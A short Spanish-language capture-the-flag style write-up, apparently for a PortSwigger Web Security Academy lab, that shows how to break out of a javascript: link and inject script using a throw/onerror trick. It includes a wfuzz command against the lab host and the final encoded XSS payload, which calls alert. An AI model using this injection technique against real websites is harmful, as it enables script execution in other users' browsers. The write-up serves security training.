___
- tags: #xss #owasp #portswigger 
___
## Paso a paso

Buscamos en el código fuente por la palabra **script** 

### Encontramos
```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5'}).finally(_ => window.location = '/')">Back to Blog</a>
```

### Lo decodificamos
```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=5'}).finally(_ => window.location = '/')">Back to Blog</a>
```

### payload

```html
<a href="javascript:fetch(
'/analytics',{method:'post',body:'/post?postId=5'},{x:''}).finally(_ => window.location = '/')">Back to Blog</a>
```

y vemos que no es un post valido (por el id), por lo que probamos ver que carácter concatenado a la url me permite inyectar el código.

```bash
wfuzz -c -w /usr/share/SecLists/Fuzzing/special-chars.txt 'https://0aea00a403092cec82eef6da000b0081.web-security-academy.net/post?postId=4FUZZ%27},{x%27'
```

Identificamos que responde con 200 el '#' y el '&'

### Intentamos ver que se interpreta en throw
```html
<script>x=x=>{throw/**/onerror=alert,1337},toString=x,window+'';</script>
```

Efectivamente nos interpreta antes de lanzar la excepción del valor 1337 y llamamos a la función 'x' con la window ya que al intentar sumar la cadena vacía javascript lo interpreta como que debiera sumar el valor de arriba.

## Solución
Inyectamos esta cadena en la url pero lo codificamos
### URL sin codificar
```html
&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:';
```

### URL codificada
```html
&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window%2B'',{x:';
```